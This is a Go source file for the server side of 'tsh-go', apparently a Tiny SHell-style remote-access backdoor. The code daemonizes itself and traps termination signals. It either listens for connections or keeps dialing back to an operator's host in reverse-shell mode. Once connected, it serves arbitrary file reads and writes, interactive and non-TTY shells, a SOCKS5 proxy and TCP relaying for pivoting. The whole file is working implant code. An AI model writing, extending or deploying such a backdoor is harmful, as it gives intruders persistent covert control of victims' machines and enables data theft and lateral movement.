package server

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/signal"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"tsh-go/internal/bg"
	"tsh-go/internal/constants"
	"tsh-go/internal/pel"
	"tsh-go/internal/protocol"
	"tsh-go/internal/pty"
	"tsh-go/internal/socks5"
	"tsh-go/internal/utils"

	"github.com/hashicorp/yamux"
)

// the reason why we need serverRunner is to gracefully stop the server when receiving kill command
type serverRunner struct {
	done chan struct{}
	once sync.Once
}

func newServerRunner() *serverRunner {
	return &serverRunner{done: make(chan struct{})}
}

func (r *serverRunner) stop() {
	r.once.Do(func() {
		close(r.done)
	})
}

func (r *serverRunner) stopped() bool {
	select {
	case <-r.done:
		return true
	default:
		return false
	}
}

func Run(secret []byte, host string, port int, delay int, runAsDaemon bool) error {
	var isDaemon bool
	if os.Getenv("TSH_RUNNING_AS_DAEMON") == "1" {
		isDaemon = true
		os.Unsetenv("TSH_RUNNING_AS_DAEMON")
	}
	if runAsDaemon && !isDaemon {
		if err := bg.RunInBackground(); err != nil {
			return fmt.Errorf("failed to run as daemon: %w", err)
		}
		return nil
	}

	if runAsDaemon {
		// don't let system kill our child process after closing cmd.exe
		sigchan := make(chan os.Signal, 1)
		signal.Notify(sigchan,
			syscall.SIGINT,
			syscall.SIGTERM,
			syscall.SIGQUIT)
	}

	// apply kdf
	secret = utils.KDF(secret)
	runner := newServerRunner()

	if host == "" {
		addr := fmt.Sprintf(":%d", port)
		ln, err := pel.Listen(addr, secret, false)
		if err != nil {
			return err
		}
		defer ln.Close()
		go func() {
			// when runner is stopped, close listener to unblock Accept
			<-runner.done
			ln.Close()
		}()
		for {
			stream, err := ln.Accept()
			if err == nil {
				go handleGeneric(runner, stream)
			} else {
				// if error is due to listener being closed, exit gracefully
				if runner.stopped() {
					return nil
				}
				log.Printf("Accept failed: %v\n", err)
			}
		}
	} else {
		// connect back mode
		addr := fmt.Sprintf("%s:%d", host, port)
		for {
			if runner.stopped() {
				return nil
			}
			stream, err := pel.Dial(addr, secret, true)
			if err == nil {
				log.Println("Connected to", addr)
				go handleGeneric(runner, stream)
			} else {
				log.Printf("Dial failed: %v\n", err)
			}
			select {
			case <-runner.done:
				return nil
			case <-time.After(time.Duration(delay) * time.Second):
			}
		}
	}
}

// entry handler,
// automatically close connection after handling
// it's safe to run with goroutine
func handleGeneric(runner *serverRunner, stream utils.DuplexStreamEx) {
	defer stream.Close()
	defer func() {
		err := recover()
		if err != nil {
			log.Println(err)
		}
	}()
	req, err := protocol.ReadRequest(stream)
	if err != nil {
		log.Println(err)
		return
	}
	switch req.Mode {
	case protocol.Kill:
		runner.stop()
	case protocol.GetFile:
		handleGetFile(stream)
	case protocol.PutFile:
		handlePutFile(stream)
	case protocol.RunShell:
		handleRunShell(stream)
	case protocol.SOCKS5:
		handleSocks5(stream)
	case protocol.Pipe:
		handlePipe(stream)
	case protocol.RunShellNoTTY:
		handleRunShellNoTTY(stream)
	}
}

func handleGetFile(stream utils.DuplexStreamEx) {
	buffer := make([]byte, constants.MaxMessagesize)
	filenamebuf, err := utils.ReadVarLength(stream, buffer)
	if err != nil {
		return
	}
	filename := string(filenamebuf)
	f, err := os.Open(filename)
	if err != nil {
		protocol.WriteStatusError(stream, err)
		return
	}
	defer f.Close()
	fi, err := f.Stat()
	if err != nil {
		protocol.WriteStatusError(stream, err)
		return
	}
	if fi.IsDir() {
		protocol.WriteStatusError(stream, fmt.Errorf("%s is a directory", filename))
		return
	}
	if err := protocol.WriteStatusOK(stream); err != nil {
		return
	}
	utils.CopyBuffer(stream, f, buffer)
	stream.Close()
}

func handlePutFile(stream utils.DuplexStreamEx) {
	buffer := make([]byte, constants.MaxMessagesize)
	destbuf, err := utils.ReadVarLength(stream, buffer)
	if err != nil {
		return
	}
	destination := filepath.FromSlash(string(destbuf))
	basenamebuf, err := utils.ReadVarLength(stream, buffer)
	if err != nil {
		return
	}
	basename := string(basenamebuf)
	if runtime.GOOS == "windows" {
		basename = strings.ReplaceAll(basename, ":", "_")
		basename = strings.ReplaceAll(basename, "\\", "_")
	}

	// if dst is a directory, save file to dst/basename
	// otherwise, save file to dst
	if fi, err := os.Stat(destination); err == nil && fi.IsDir() {
		destination = filepath.Join(destination, basename)
	}

	f, err := os.OpenFile(destination, os.O_CREATE|os.O_RDWR|os.O_TRUNC, 0644)
	if err != nil {
		protocol.WriteStatusError(stream, err)
		return
	}
	defer f.Close()
	if err := protocol.WriteStatusOK(stream); err != nil {
		return
	}
	utils.CopyBuffer(f, stream, buffer)
	stream.Close()
}

func handleRunShell(stream utils.DuplexStreamEx) {
	buffer1 := make([]byte, constants.MaxMessagesize)
	buffer2 := make([]byte, constants.MaxMessagesize)
	termbuf, err := utils.ReadVarLength(stream, buffer1)
	if err != nil {
		return
	}
	term := string(termbuf)

	termsize := make([]byte, 4)
	_, err = io.ReadFull(stream, termsize)
	if err != nil {
		return
	}
	ws_row := int(termsize[0])<<8 + int(termsize[1])
	ws_col := int(termsize[2])<<8 + int(termsize[3])

	cmdbuf, err := utils.ReadVarLength(stream, buffer1)
	if err != nil {
		return
	}
	command := string(cmdbuf)

	tp, err := pty.OpenPty(command, term, uint32(ws_col), uint32(ws_row))
	if err != nil {
		return
	}
	defer tp.Close()
	if err := utils.DuplexPipe(stream, utils.DSEFromRW(tp.StdOut(), tp.StdIn()), buffer1, buffer2); err != nil {
		log.Println(err)
	}
}

func handleRunShellNoTTY(stream utils.DuplexStreamEx) {
	buffer1 := make([]byte, constants.MaxMessagesize)
	cmdbuf, err := utils.ReadVarLength(stream, buffer1)
	if err != nil {
		return
	}
	command := string(cmdbuf)

	cmd := runShellCommand(command)
	stdin, err := cmd.StdinPipe()
	if err != nil {
		log.Println(err)
		return
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Println(err)
		return
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		log.Println(err)
		return
	}
	combinedOutput := io.MultiReader(stdout, stderr)
	if err := cmd.Start(); err != nil {
		log.Println(err)
		return
	}
	if err := utils.DuplexPipe(stream, utils.DSEFromRW(combinedOutput, stdin), nil, nil); err != nil {
		log.Println(err)
	}
	_ = cmd.Wait()
}

func handleSocks5(stream utils.DuplexStreamEx) {
	config := yamux.DefaultConfig()
	config.LogOutput = io.Discard
	session, err := yamux.Server(stream, config)
	if err != nil {
		log.Println(err)
		return
	}
	defer session.Close()

	for {
		conn, err := session.Accept()
		if err != nil {
			log.Println(err)
			return
		}
		go handleSocks5Stream(utils.DSEFromRW(conn, conn))
	}
}

func handleSocks5Stream(stream utils.DuplexStreamEx) {
	defer stream.Close()

	srv, _ := socks5.NewClassicServer("", "")
	srv.SupportedCommands = []byte{socks5.CmdConnect} // TODO: CmdUDP
	if err := srv.Negotiate(stream); err != nil {
		log.Println(err)
		return
	}
	req, err := srv.GetRequest(stream)
	if err != nil {
		log.Println(err)
		return
	}
	log.Println("Request type", req.Cmd)
	if req.Cmd == socks5.CmdConnect {
		conn, err := req.Connect(stream)
		if err != nil {
			stream.Close()
			log.Println(err)
			return
		}
		log.Println("Connection established", conn.RemoteAddr())
		if err := utils.DuplexPipe(stream, conn, nil, nil); err != nil {
			log.Println(err)
		}
		log.Println("Connection closed", conn.RemoteAddr())
		return
	}
}

func handlePipe(stream utils.DuplexStreamEx) {
	addrbuf, err := utils.ReadVarLength(stream, nil)
	if err != nil {
		return
	}
	addr := string(addrbuf)
	log.Println("Connecting to", addr)
	parsedAddr, err := net.ResolveTCPAddr("tcp", addr)
	if err != nil {
		protocol.WriteStatusError(stream, err)
		return
	}
	conn, err := net.DialTCP("tcp", nil, parsedAddr)
	if err != nil {
		protocol.WriteStatusError(stream, err)
		return
	}
	if err := protocol.WriteStatusOK(stream); err != nil {
		return
	}
	defer func() {
		conn.Close()
		log.Println("Disconnected", addr)
	}()
	if err := utils.DuplexPipe(stream, conn, nil, nil); err != nil {
		log.Println(err)
	}
}
